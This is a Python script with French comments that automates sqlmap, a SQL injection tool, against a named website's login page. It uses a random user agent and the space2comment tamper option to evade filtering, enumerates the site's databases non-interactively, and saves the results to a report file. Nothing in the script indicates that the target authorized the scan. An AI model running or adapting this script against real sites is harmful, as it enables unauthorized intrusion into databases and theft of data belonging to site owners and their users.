import os
import subprocess
import datetime

# Définir l'URL cible
URL_CIBLE = "https://regisono.com/login.php?id=1"

# Définir le chemin complet de SQLMap
SQLMAP_PATH = "C:\\Users\\aboul\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\sqlmap.exe"

# Définir le répertoire de sortie des résultats
DATE_EXECUTION = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
OUTPUT_DIR = f"sqlmap_results_{DATE_EXECUTION}"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Commande SQLMap
commande_sqlmap = [
    SQLMAP_PATH,
    "-u", URL_CIBLE,
    "--batch",
    "--random-agent",
    "--level", "3",
    "--risk", "2",
    "--tamper=space2comment",
    "--output-dir", OUTPUT_DIR,
    "--flush-session",
    "--dbs"
]

# Lancer l'analyse SQLMap
print(f" Lancement de l'analyse SQLMap sur {URL_CIBLE}...")
try:
    resultat = subprocess.run(commande_sqlmap, capture_output=True, text=True, check=True)
    print(resultat.stdout)
    
    # Enregistrer les résultats dans un fichier
    rapport_fichier = os.path.join(OUTPUT_DIR, "rapport_sqlmap.txt")
    with open(rapport_fichier, "w", encoding="utf-8") as f:
        f.write(resultat.stdout)
    
    print(f" Rapport SQLMap enregistré dans {rapport_fichier}")

except subprocess.CalledProcessError as e:
    print(f" Erreur lors de l'exécution de SQLMap : {e}")
    print(f" Sortie d'erreur : {e.stderr}")

print(" Analyse terminée.")
